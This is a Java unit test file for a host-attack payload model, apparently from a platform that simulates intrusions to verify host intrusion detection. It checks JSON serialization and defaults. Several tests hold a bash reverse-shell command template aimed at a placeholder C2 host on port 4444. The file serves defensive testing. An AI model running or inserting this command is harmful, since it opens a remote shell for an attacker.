package io.veriguard.database.model;

import static org.assertj.core.api.Assertions.assertThat;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.node.ArrayNode;
import com.fasterxml.jackson.databind.node.ObjectNode;
import com.fasterxml.jackson.datatype.jsr310.JavaTimeModule;
import java.util.List;
import org.junit.jupiter.api.Test;

/**
 * P1.1 HostAttack PayloadType 子类单元测试 —— 招标 §3 主机入侵检测验证.
 *
 * <p>覆盖：
 *
 * <ul>
 *   <li>{@code hidsExpectedArtifacts} 默认初始化为空 list（避免 null）
 *   <li>{@link Payload#getTypeEnum()} 解析 discriminator "HostAttack"
 *   <li>JSON ser/de round-trip：标量列 + JSONB list 全字段还原
 *   <li>缺失 JSONB key 时回退到默认空 list
 *   <li>Jackson tree 序列化产出 JSON array
 * </ul>
 */
class HostAttackPayloadTest {

  @Test
  void default_expected_artifacts_is_empty_list() {
    HostAttackPayload p = new HostAttackPayload();
    assertThat(p.getHidsExpectedArtifacts()).isNotNull().isEmpty();
  }

  @Test
  void type_enum_resolves_host_attack() {
    HostAttackPayload p = newPayload();
    assertThat(p.getTypeEnum()).isEqualTo(PayloadType.HOST_ATTACK);
  }

  @Test
  void json_round_trip_preserves_all_fields() throws Exception {
    HostAttackPayload original = newPayload();
    original.setHidsExpectedArtifacts(
        List.of("/proc/<pid>/cmdline contains bash -i", "/tmp/.X11-unix/.X0-lock"));

    ObjectMapper mapper = new ObjectMapper().registerModule(new JavaTimeModule());
    String json = mapper.writeValueAsString(original);

    assertThat(json).contains("\"payload_type\":\"HostAttack\"");
    assertThat(json).contains("\"hids_category\":\"reverse_shell\"");
    assertThat(json).contains("\"hids_execution_mode\":\"command\"");
    assertThat(json).contains("\"hids_command_template\"");
    assertThat(json).contains("\"hids_artifact_path\"");
    assertThat(json).contains("\"hids_expected_artifacts\"");

    HostAttackPayload decoded = mapper.readValue(json, HostAttackPayload.class);
    assertThat(decoded.getHidsCategory()).isEqualTo("reverse_shell");
    assertThat(decoded.getHidsExecutionMode()).isEqualTo("command");
    assertThat(decoded.getHidsCommandTemplate())
        .isEqualTo("bash -i >& /dev/tcp/{{C2_HOST}}/4444 0>&1");
    assertThat(decoded.getHidsArtifactPath()).isEqualTo("/tmp/.X11-unix/.X0-lock");
    assertThat(decoded.getHidsExpectedArtifacts()).hasSize(2);
    assertThat(decoded.getHidsExpectedArtifacts().get(0))
        .isEqualTo("/proc/<pid>/cmdline contains bash -i");
  }

  @Test
  void json_decode_when_expected_artifacts_absent_keeps_default_empty() throws Exception {
    ObjectMapper mapper = new ObjectMapper().registerModule(new JavaTimeModule());
    ObjectNode legacy = mapper.createObjectNode();
    legacy.put("payload_type", "HostAttack");
    legacy.put("hids_category", "reverse_shell");
    legacy.put("hids_execution_mode", "command");
    legacy.put("hids_command_template", "bash -i >& /dev/tcp/{{C2_HOST}}/4444 0>&1");
    HostAttackPayload decoded =
        mapper.readValue(mapper.writeValueAsString(legacy), HostAttackPayload.class);
    assertThat(decoded.getHidsExpectedArtifacts()).isNotNull().isEmpty();
    assertThat(decoded.getHidsArtifactPath()).isNull();
  }

  @Test
  void array_node_serialization_round_trip_via_jackson_tree() {
    HostAttackPayload p = newPayload();
    p.setHidsExpectedArtifacts(List.of("/var/log/auth.log"));

    ObjectMapper mapper = new ObjectMapper().registerModule(new JavaTimeModule());
    ObjectNode tree = (ObjectNode) mapper.valueToTree(p);

    assertThat(tree.has("hids_expected_artifacts")).isTrue();
    ArrayNode arr = (ArrayNode) tree.get("hids_expected_artifacts");
    assertThat(arr.size()).isEqualTo(1);
    assertThat(arr.get(0).asText()).isEqualTo("/var/log/auth.log");
  }

  private static HostAttackPayload newPayload() {
    // Use the (id, type, name) constructor so Payload.type (the parent discriminator field,
    // @Setter(NONE)) is initialized — getTypeEnum() reads it and rejects null.
    HostAttackPayload p =
        new HostAttackPayload(
            "test-id", HostAttackPayload.HOST_ATTACK_TYPE, "HIDS-REVERSESHELL-001");
    p.setHidsCategory("reverse_shell");
    p.setHidsExecutionMode("command");
    p.setHidsCommandTemplate("bash -i >& /dev/tcp/{{C2_HOST}}/4444 0>&1");
    p.setHidsArtifactPath("/tmp/.X11-unix/.X0-lock");
    return p;
  }
}
